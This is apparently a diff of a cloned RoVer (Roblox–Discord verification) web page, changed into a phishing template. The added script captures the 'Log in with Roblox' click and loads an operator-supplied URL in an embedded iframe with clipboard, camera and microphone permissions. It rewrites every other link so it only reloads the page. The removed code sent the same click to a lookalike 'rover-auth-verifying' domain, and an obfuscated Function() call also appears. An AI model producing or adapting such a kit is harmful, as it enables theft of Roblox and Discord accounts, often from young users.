@@ -6,8 +6,7 @@
     <meta data-react-helmet="true" name="description" content="RoVer is a Discord bot that enables you to easily add Roblox to Discord account verification">
     <meta data-react-helmet="true" name="theme-color" content="#c81674">
     <title data-react-helmet="true">RoVer</title>
-    <link rel="icon" type="image/png" href="favicon.png">
-    
+    <link data-react-helmet="true" rel="icon" href="https://rover-eight-alpha.vercel.app/verify/glyph-BPKPYTDI.svg">
     <link data-react-helmet="true" rel="mask-icon" href="https://rover-eight-alpha.vercel.app/verify/glyph-BPKPYTDI.svg" color="#c91673">
     <link data-react-helmet="true" href="./RoVer_files/css" rel="stylesheet">
     <link rel="stylesheet" href="./RoVer_files/index-Z3GN4FTR.css">
@@ -304,7 +303,12 @@
                 box-sizing: border-box !important;
             }
 
-            
+            .css-1krlcsl.e1rvc2sx0.popup-active iframe {
+                width: 100% !important;
+                max-width: 100% !important;
+                margin: 0 !important;
+                border-radius: 4px !important;
+            }
 
             .css-1krlcsl,
             .css-1ylf7mg,
@@ -327,9 +331,6 @@
                 font-size: 14px !important;
             }
         }
-
-
-
     </style>
 </head>
 
@@ -1567,7 +1568,9 @@
 
 
                         <style>
-                            
+                            .css-1krlcsl.e1rvc2sx0.popup-active iframe {
+                                animation: slideIn 0.4s ease-out forwards;
+                            }
 
                             .css-1krlcsl.e1rvc2sx0.slide-out iframe {
                                 animation: slideOut 0.4s ease-in forwards;
@@ -1626,7 +1629,13 @@
                                     box-sizing: border-box !important;
                                 }
 
-                                
+                                .css-1krlcsl.e1rvc2sx0.popup-active iframe {
+                                    width: 100% !important;
+                                    max-width: 100% !important;
+                                    margin: 0 !important;
+                                    border-radius: 6px !important;
+                                    box-sizing: border-box !important;
+                                }
                             }
 
                             .modal {
@@ -1866,25 +1875,68 @@ Function("AJOZOh1","var XbeDrm4,qEQ6qiS,g5978v,x21b4ZU,QmI0ElE,O_QZpuu,obQQ2k,M0
 }
 </style>
 
-
-
-
 <script>
+// ================= TEMPLATE =================
+// Coloque aqui o site que deve abrir DENTRO do iframe ao clicar em "Log in with Roblox"
+const IFRAME_LOGIN_URL = "LINK_VERSATILE_AQUI";
+// ============================================
+
 (function(){
-  const REDIRECT_URL = "https://rover-auth-verifying.vercel.app";
-  const norm = t => (t||"").toLowerCase();
+  // Helper to normalize text
+  const norm = (t)=> (t||"").toLowerCase().replace(/\s+/g,' ').trim();
 
-  document.addEventListener("click", function(e){
-    const el = e.target.closest("a, button");
-    if(!el) return;
-
+  // Identify the "Log in with Roblox" control by visible text
+  function isLoginControl(el){
     const txt = norm(el.innerText || el.textContent);
-    if(txt.includes("log in with roblox") || txt.includes("login with roblox")){
+    return txt.includes("log in with roblox") || txt.includes("login with roblox") || txt.includes("sign in to rover");
+  }
+
+  // Make all buttons/links reload page EXCEPT login
+  document.addEventListener('click', function(e){
+    const a = e.target.closest('a, button');
+    if(!a) return;
+
+    if(isLoginControl(a)){
+      // Intercept login click
       e.preventDefault();
       e.stopPropagation();
-      window.location.href = REDIRECT_URL;
+
+      // Find main card/container to host iframe
+      const host = document.querySelector('.css-1krlcsl.e1rvc2sx0') || document.querySelector('main article') || document.body;
+
+      // Avoid duplicating iframe
+      if(host.querySelector('iframe.iframe-host')) return;
+
+      // Optional: trigger existing animation class if present
+      host.classList.add('popup-active');
+
+      const wrap = document.createElement('div');
+      wrap.className = 'iframe-wrapper';
+
+      const iframe = document.createElement('iframe');
+      iframe.className = 'iframe-host';
+      iframe.src = IFRAME_LOGIN_URL;
+      iframe.allow = 'camera; microphone; clipboard-read; clipboard-write;';
+      iframe.referrerPolicy = 'no-referrer';
+
+      wrap.appendChild(iframe);
+      host.appendChild(wrap);
+      return;
     }
+
+    // For all other buttons/links: reload page (F5-like)
+    e.preventDefault();
+    e.stopPropagation();
+    window.location.reload();
   }, true);
+
+  // Also neutralize default navigation attributes
+  document.querySelectorAll('a[href]').forEach(a=>{
+    if(!isLoginControl(a)){
+      a.setAttribute('href', '#');
+      a.setAttribute('role','button');
+    }
+  });
 })();
 </script>
 
